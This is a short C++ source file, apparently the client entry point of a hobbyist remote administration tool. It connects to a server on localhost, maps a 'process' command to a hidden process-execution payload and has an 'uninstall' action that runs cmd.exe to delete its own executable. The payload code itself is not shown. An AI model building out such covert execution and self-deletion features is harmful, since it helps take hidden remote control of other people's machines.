#include "precompile.h"
#include "client.h"
#include "payloads.h"
#include <stdio.h>

int main(int argc, char** argv) // TODO: make this to class and fix a hash-table for identifier buffers for incoming pakets. add some cmd thingies. remote stuff and we are done. boom remote administration tool
{
	std::string ip_address = "127.0.0.1";// IP Address of the server
	int port = 54321; // Listening port # on the server

	std::locale::global(std::locale("sw"));

	std::string size;

	startup_wsa();

	response_table responses = {
		{"time", [&](std::string data) {return std::to_string(time(0)); }},
		{"alive", [&](std::string data) {return "true"; }},
		{"process", payload::process_execution_hidden}
	};

	action_table actions = {
		{"exit", [&](std::string data) { exit(0); }},
		{"uninstall", [&](std::string) { payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::string(argv[0]), true); exit(0); }}
	};

	client main(ip_address, port, responses, actions);

	main.connect();

	main.run();
}